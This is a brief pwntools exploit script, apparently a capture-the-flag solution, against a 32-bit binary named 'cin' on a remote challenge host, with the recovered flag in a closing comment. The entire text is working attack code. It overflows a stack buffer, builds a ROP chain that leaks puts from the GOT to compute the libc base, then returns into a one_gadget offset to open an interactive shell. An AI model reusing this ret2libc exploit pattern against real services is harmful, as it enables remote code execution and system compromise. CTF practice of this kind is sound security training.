from pwn import *
elf = ELF('./cin', checksec=False)
libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so', checksec=False)
p = remote('not.codepwnda.id', 17666)
p.sendlineafter(b'\n\n', b'A'*(0x44+8) + p32(elf.plt['puts']) + p32(elf.sym['_Z4vulnv']) + p32(elf.got['puts']))
libc.address = u32(p.recv(8)[:-4].ljust(4, b'\x00')) - libc.sym['puts']
log.info('base : 0x%x'%libc.address)
p.sendline(b'A'*(0x44+8) + p32(libc.address + 0x3a819) + b'\x00'*(0x34+4))
p.interactive()
#codepwnda{welcome_to_h3ll}